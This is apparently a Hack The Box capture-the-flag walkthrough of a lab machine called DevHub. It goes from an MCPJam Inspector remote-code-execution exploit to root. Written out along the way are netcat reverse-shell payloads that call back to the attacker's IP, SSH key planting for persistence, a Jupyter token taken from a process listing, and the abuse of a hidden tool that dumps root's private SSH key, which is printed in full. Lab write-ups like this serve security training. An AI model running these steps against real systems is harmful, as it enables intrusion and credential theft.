<img src="Images/01-Banner.png" width="600">

## HTB-DevHub

We will begin this machine by using Nmap to scan the server for all open TCP ports, service versions and perform script scanning:

#### Nmap scan:

```
nmap -p0-65535 -sCV 10.129.245.216
```

#### Results:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Mon, 09 Nov 2026 12:33:39 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Mon, 09 Nov 2026 12:33:39 GMT
|_    Connection: close
```

## User -> MCP-Dev

The results reveal that an Nginx web server is running on port 80 and MCPJam Inspector is running on port 6274. Let's visit port 80:

<img src="Images/03-Landing.png" width="600">

As we can see, MCPJam is shown to be running. Let's investigate that next:

<img src="Images/04-MCPjam.png" width="600">

This reveals the version is 1.4.2. A search for related exploits reveals the following Proof of Concept:

<img src="Images/05-Exploit-Location.png" width="600">

The documentation show's how we can obtain code execution on the server. Let's first start a listener before modifying the exploit so that we can execute a reverse shell:

#### Starting the listener:

```
nc -lvnp 4444
```

#### Downloading the exploit:

```
git clone https://github.com/boroeurnprach/CVE-2026-23744-PoC
```

#### Running the exploit:

```
python3 exploit.py devhub.htb 'busybox nc 10.10.14.28 4444 -e /bin/bash'
```

#### Exploit output:

```
[*] Waiting for server to start on port 6274...
[+] Server is up and running.
[*] Sending exploit payload...
[*] Request failed (this might be expected if the command execution interrupts the connection): HTTPConnectionPool(host='devhub.htb', port=6274): Read timed out. (read timeout=5)
[+] Payload sent.
```

#### Listener output:

```
Listening on 0.0.0.0 4444
Connection received on 10.129.245.216 47714
id
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

We then use the following commands to stabilise the shell:

```bash
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
export TERM=xterm
ctrl-z
stty raw -echo; fg
```

We will now generate SSH keys for the target machine using ssh-keygen before importing our attacker host public key into the authorized keys file:

#### Key generation on victim machine:

```
ssh-keygen
```

#### Output:

```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/mcp-dev/.ssh/id_rsa): 
Created directory '/home/mcp-dev/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/mcp-dev/.ssh/id_rsa
Your public key has been saved in /home/mcp-dev/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:+AFc1i370+TY86n7eVGRTvNkMztP1hqzTFkQENdHeT0 mcp-dev@devhub
The key's randomart image is:
+---[RSA 3072]----+
|        o. .oo+==|
|     . o  o .. EO|
|      o    o  o=%|
|       o  .   *+*|
|      . S  . O B+|
|       . .  + O..|
|        .    . oo|
|               .+|
|             o+o.|
+----[SHA256]-----+
```

#### Key generation on attacker machine:

```
ssh-keygen
```

#### Reading attacker public key:

```
cat /root/.ssh/id_ed25519.pub
```

#### Output:

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA19Tw8D/Jv2ecF1vmaK946E5bhE9Ne9UeehFJ08wB4W root@htb-c6lz08re7g
```

Now let's update the victim machine's authorized_keys file:

```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA19Tw8D/Jv2ecF1vmaK946E5bhE9Ne9UeehFJ08wB4W root@htb-c6lz08re7g" >> /home/mcp-dev/.ssh/authorized_keys
```

Now, we can log into the machine using the attacker machine's private key:

#### Logging in using SSH:

```
ssh -i /root/.ssh/id_ed25519 mcp-dev@10.129.245.216
```

#### Output:

```
mcp-dev@devhub:~$ 
```

## MCP-Dev -> Analyst

Enumerating the system, we display running processes for the analyst user, which discloses a token for Jupyter notebook on port 8888:

#### Reading running processes:

```
ps aux | grep analyst
```

#### Extracting sensitive token value:

```
--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

The process also discloses that port 8888 is running Jupyter Notebook. Let's forward that port using our SSH session:

#### Port forwarding:

```
ssh -i /root/.ssh/id_ed25519 mcp-dev@10.129.245.216 -L 8888:127.0.0.1:8888
```

Now we will visit port 8888 on our attacker machine before using our newly discovered token to log into Jupyter Notebook:

<img src="Images/13-Jupyter1.png" width="600">

Logging into Jupyter reveals that we have access to a Python console:

<img src="Images/14-Jupyter2.png" width="600">

Let's set up a Netcat listener first:

#### Start Netcat listener:

```
nc -lvnp 4444
```

Next, we will generate a Python3 reverse shell using RevShells.com and execute the code within the Python console:

<img src="Images/28-revshell.png" width="600">

Once we execute the code, we catch a reverse shell, as shown below:

#### Output:

```
Listening on 0.0.0.0 4444
Connection received on 10.129.245.216 59334
analyst@devhub:~/notebooks$
```

Again, we will stablise the shell:

```bash
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
export TERM=xterm
ctrl-z
stty raw -echo; fg
```

And again, we will set Analyst's authorized_keys file to contain our attacker's public SSH key:

```
ssh-keygen
```

#### Writing to authorized_keys:

```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA19Tw8D/Jv2ecF1vmaK946E5bhE9Ne9UeehFJ08wB4W root@htb-c6lz08re7g" >> /home/analyst/.ssh/authorized_keys
```

#### Logging in as Analyst:

```
ssh -i /root/.ssh/id_ed25519 analyst@10.129.245.216
```

#### Output:

```
analyst@devhub:~$
```

## Analyst -> Root

Enumerating the machine with our new user, we discover the file /opt/opsmcp/server.py. Inspecting this file we discover a secret key:

#### Secret Key:

```
# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

Displaying connections using netstat reveals port 5000 is running locally:

#### Running Netstat:

```
netstat -pant | grep 5000
```

#### Output:

```
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
```

We will test this connection using curl, as shown below:

#### Running cURL:

```
curl localhost:5000
```

#### Output:

```
{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}
```

It tells us that authorisation is required, therefore we will retest our connection with the secret key we discovered in server.py:

#### Running cURL with secret key:

```
curl localhost:5000/tools/list -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a'
```

#### Output:

```
{"count":4,"details":{"ops.check_disk":{"description":"Check disk usage","parameters":{}},"ops.list_services":{"description":"List running services","parameters":{}},"ops.system_status":{"description":"Get system status and health metrics","parameters":{}},"ops.view_logs":{"description":"View recent system logs","parameters":{"service":"string"}}},"tools":["ops.system_status","ops.list_services","ops.check_disk","ops.view_logs"]}
```

Closer inspection of server.py reveals hidden tools not available in the /tools/list function:

```
# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}
```

The ops._admin_dump tool sounds interesting. Moreover, the code also says that if the target parameter is set to "ssh_keys" it will dump root's private SSH key:

```
if target == "ssh_keys":
    try:
        with open('/root/.ssh/id_rsa', 'r') as f:
            key_data = f.read()
        return jsonify({
            "target": "ssh_keys",
            "root_private_key": key_data,
            "note": "Emergency recovery key dump"
        })
    except Exception as e:
        return jsonify({
            "target": "ssh_keys",
            "error": f"Could not read key: {str(e)}"
        })
```

I needed to use AI for this part, but essentially we are able to leverage these factors to create a POST request to extract the root SSH key, like so:

#### Extracting the root SSH key:

```
curl -X POST localhost:5000/tools/call -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' -H 'Content-Type: application/json' -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```

#### Output:

```
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```
